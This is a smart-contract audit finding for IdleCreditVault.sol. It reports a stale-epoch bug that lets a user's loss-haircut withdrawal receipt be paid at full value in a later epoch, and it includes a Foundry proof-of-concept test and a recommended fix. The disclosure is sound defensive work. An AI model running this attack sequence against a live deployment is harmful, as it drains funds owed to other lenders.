### Title
Stale `lastWithdrawRequest` lets a loss-adjusted receipt be re-paid at par in a later epoch - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault` tracks a user's loss-adjusted withdrawal epoch only through the single slot `lastWithdrawRequest[_user]`. When a user's pending receipt is haircut by `stopEpochWithDuration` (`lossRecoveryPriceByEpoch[epoch]`), the receipt's full pre-haircut basis stays inside `withdrawsRequests[_user]`/`withdrawsRequestsByEpoch[_user][epoch]`. If the user does not claim and instead makes a new `requestWithdraw` in a later epoch, `lastWithdrawRequest[_user]` is overwritten, the loss-adjusted claim path can no longer see the old haircut epoch, and `_claimFundedWithdrawRequest` pays the aggregate (including the haircutted basis) at par. The residual uncleared haircut is effectively "duplicated" back into a full claim — the analog of uncleared sensitive buffer data being reused.

### Finding Description
Relevant code in `contracts/strategies/idle/IdleCreditVault.sol`:

- `requestWithdraw` stores only the latest epoch: `lastWithdrawRequest[_user] = currentEpoch` (line 282) and accrues `withdrawsRequests[_user] += _amount`, `withdrawsRequestsByEpoch[_user][currentEpoch] += _amount` (lines 292-293). [1](#0-0) 
- On a lossy stop, `collectWithdrawFunds` sets `pendingWithdraws = 0` and stores `lossRecoveryPriceByEpoch[epochNumber]`, but the per-user basis is not reduced; only `_amount` (post-haircut) underlying is pulled in (lines 413-429). [2](#0-1) 
- `_claimLossAdjustedWithdrawRequest` looks up `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]` only — older epochs with a stored loss price are unreachable once `lastWithdrawRequest` is overwritten (lines 789-800). [3](#0-2) 
- `_claimFundedWithdrawRequest` then pays `withdrawsRequests[_user]` in full (lines 338-349); nothing ever subtracts the epoch-A haircut remainder. [4](#0-3) 
- `_clearWithdrawClaimForEpoch` explicitly assumes any receipt surviving after clearing the latest epoch is "older and already funded" (lines 832-836), which is false for an older loss-adjusted epoch. [5](#0-4) 

Attack sequence (KYC'd lender, unprivileged):
1. Buffer: deposit, get tranche tokens. Epoch runs.
2. Before stop, `requestWithdraw` — receipt basis `B_A` recorded under epoch N.
3. Manager calls `stopEpochWithDuration(apr, 0, duration, loss)`; borrower funds only `B_A * lossPrice`; `lossRecoveryPriceByEpoch[N]` set.
4. User does **not** claim. Next buffer: deposit again, `requestWithdraw` small amount `B_B` → `lastWithdrawRequest = N+1`, `withdrawsRequests = B_A + B_B`.
5. After epoch N+1 ends, `claimWithdrawRequest`: loss-adjusted path checks `lossRecoveryPriceByEpoch[N+1] == 0` → skips; funded path pays `B_A + B_B` at par, though only `B_A*lossPrice + B_B` was funded.

### Impact Explanation
Direct theft / insolvency equal to the unpaid haircut `B_A * (1 - lossRecoveryPrice)` per user. The strategy's funded-claim reserve holds only the post-haircut amount, so the excess is paid from underlyings earmarked for other pending/funded claimants, leaving later claimants unable to withdraw. With a large loss (e.g. 90% haircut) a single user can extract ~90% of their receipt basis that was already socialized as a loss.

### Likelihood Explanation
Requires a `stopEpochWithDuration` with `_lossAmount > 0` while the attacker has a pending receipt, then one more deposit+request cycle — all normal user actions (the code comment at lines 323-324 explicitly supports re-requesting before claiming). No privileged misbehavior needed; the lossy stop is an expected protocol path. Likelihood is moderate: it needs a partial-loss epoch to occur.

### Recommendation
Track loss-adjusted amounts per epoch rather than relying on `lastWithdrawRequest`. Concretely: iterate or store per-user loss-epochs (e.g. a `lossRecoveryEpochs[_user]` list or check `lossRecoveryPriceByEpoch` for every epoch present in `withdrawsRequestsByEpoch`), or subtract the haircut from `withdrawsRequestsByEpoch`/`withdrawsRequests` at `collectWithdrawFunds` time so residual basis can never be paid at par.

// Foundry fork test sketch against test/foundry/IdleCreditVault.t.sol helpers
function testLossAdjustedReceiptRepaidAtPar() external {
    uint256 amount = 10_000 * ONE_SCALE;
    uint256 mintedAA = idleCDO.depositAA(amount);          // attacker deposits

    _startEpochAndCheckPrices(0);
    uint256 reqA = cdoEpoch.requestWithdraw(mintedAA, address(AAtranche)); // receipt basis B_A
    uint256 epochA = strategy.epochNumber();

    // lossy stop: borrower funds only half of pending receipts
    uint256 pending = strategy.pendingWithdraws();
    uint256 loss = pending / 2;
    (uint256 pendingToFund, ) = strategy.previewLossAdjustedWithdrawFunds(loss);
    uint256 repay = cdoEpoch.expectedEpochInterest() + pendingToFund;
    deal(defaultUnderlying, borrower, repay);
    vm.prank(borrower); underlying.approve(address(cdoEpoch), repay);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(10e18, 0, cdoEpoch.epochDuration(), loss);
    // attacker does NOT claim (would only get reqA * lossRecoveryPrice)

    // new epoch: deposit again and request a second withdraw
    idleCDO.depositAA(amount);
    _startEpochAndCheckPrices(1);
    cdoEpoch.requestWithdraw(0, address(AAtranche));       // overwrites lastWithdrawRequest
    _stopEpochAndCheckPrices(1, 10e18, _expectedFundsEndEpoch());

    uint256 balPre = underlying.balanceOf(address(this));
    cdoEpoch.claimWithdrawRequest();
    // BUG: pays B_A at par + B_B, exceeding funded reserve by reqA*(1 - lossRecoveryPrice)
    assertGt(underlying.balanceOf(address(this)) - balPre,
             reqA * strategy.lossRecoveryPriceByEpoch(epochA) / 1e18);
}

  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
    }
  }

  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
